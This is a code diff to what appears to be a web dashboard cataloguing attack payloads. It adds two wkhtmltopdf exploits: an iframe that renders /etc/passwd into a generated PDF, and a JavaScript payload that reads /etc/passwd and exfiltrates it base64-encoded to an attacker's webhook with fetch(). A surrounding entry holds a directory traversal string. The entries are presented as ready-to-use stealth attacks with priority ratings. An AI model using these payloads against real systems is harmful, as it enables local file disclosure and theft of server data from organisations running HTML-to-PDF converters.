@@ -810,6 +810,22 @@ export default function DashboardPage({ params }) {
           tech: 'PHP Legacy Engine'
         },
         { 
+          title: 'wkhtmltopdf SSRF & LFI Local File Disclosure (Iframe)', 
+          code: `<iframe src="file:///etc/passwd" width="100%" height="500px"></iframe>`, 
+          desc: 'Exploits wkhtmltopdf HTML-to-PDF converters that compile local file:// URLs, rendering the local file contents directly inside the generated PDF.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'wkhtmltopdf Engine'
+        },
+        { 
+          title: 'wkhtmltopdf LFI Dynamic JavaScript File Exfiltration', 
+          code: `<script>x=new XMLHttpRequest();x.onload=function(){fetch('${webhookUrl}/?lfi='+btoa(this.responseText))};x.open('GET','file:///etc/passwd');x.send();</script>`, 
+          desc: 'Leverages wkhtmltopdf JavaScript execution support. Spawns an AJAX request to read local files and exfiltrate the contents via base64 directly to your webhook listener.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'wkhtmltopdf / JS Engine'
+        },
+        { 
           title: 'Standard dot-dot-slash (Zaman Batu)', 
           code: `../../../../../../etc/passwd`, 
           desc: 'Classic Unix directory traversal. Blocked by default on virtually all modern systems.',
